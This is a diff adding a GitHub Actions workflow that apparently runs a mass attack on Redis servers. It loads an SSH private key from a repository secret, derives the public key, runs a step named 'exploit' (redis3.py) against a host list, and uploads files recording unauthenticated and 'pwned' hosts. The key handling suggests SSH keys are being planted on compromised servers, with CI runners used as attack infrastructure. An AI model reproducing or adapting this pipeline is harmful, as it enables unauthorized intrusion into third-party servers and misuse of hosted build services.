@@ -1,0 +1,24 @@
+name: redis3
+on: workflow_dispatch
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 200
+    steps:
+      - uses: actions/checkout@v4
+      - name: key
+        run: |
+          echo "$KOPS_KEY" > /tmp/kops_key && chmod 600 /tmp/kops_key
+          ssh-keygen -y -f /tmp/kops_key > /tmp/kops_key.pub && chmod 644 /tmp/kops_key.pub
+        env: {KOPS_KEY: "${{ secrets.KOPS_KEY }}"}
+      - name: exploit
+        run: KOPS_KEY_FILE=/tmp/kops_key python3 redis3.py redis_hosts.txt || true
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: redis3
+          path: |
+            /tmp/redis_result3.json
+            /tmp/redis_unauth3.json
+            /tmp/redis_pwned3.json
+          if-no-files-found: warn
